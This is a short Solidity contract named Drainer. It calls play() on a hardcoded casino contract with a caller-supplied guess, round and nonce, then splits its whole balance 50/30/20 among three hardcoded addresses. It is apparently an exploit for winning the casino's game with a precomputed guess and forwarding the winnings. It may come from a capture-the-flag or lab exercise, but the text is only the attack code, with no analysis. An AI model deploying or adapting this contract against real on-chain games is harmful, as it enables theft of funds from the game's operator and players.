// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IDrainer {
    function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable;
    function distribute() external;
}

interface IFairCasino {
    function play(uint256 guess, uint256 round, uint256 nonce) external payable;
}

contract Drainer is IDrainer {
    address public constant CASINO = 0xed5415679D46415f6f9a82677F8F4E9ed9D1302b;
    address public constant LT1 = 0x1acB0745a139C814B33DA5cdDe2d438d9c35060E;
    address public constant LT2 = 0xbE99BCD0D8FdE76246eaE82AD5eF4A56b42c6B7d;
    address public constant LT3 = 0xA791D68A0E2255083faF8A219b9002d613Cf0637;
    uint256 public constant TICKET_PRICE = 0.01 ether;

    function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable override {
        IFairCasino(CASINO).play{value: TICKET_PRICE}(_guess, _round, _nonce);
        distribute();
    }

    function distribute() public override {
        uint256 bal = address(this).balance;
        require(bal > 0, "nothing to distribute");
        uint256 share1 = (bal * 50) / 100;
        uint256 share2 = (bal * 30) / 100;
        uint256 share3 = bal - share1 - share2;
        (bool ok1,) = payable(LT1).call{value: share1}("");
        (bool ok2,) = payable(LT2).call{value: share2}("");
        (bool ok3,) = payable(LT3).call{value: share3}("");
        require(ok1 && ok2 && ok3, "distribution failed");
    }

    receive() external payable {}
}
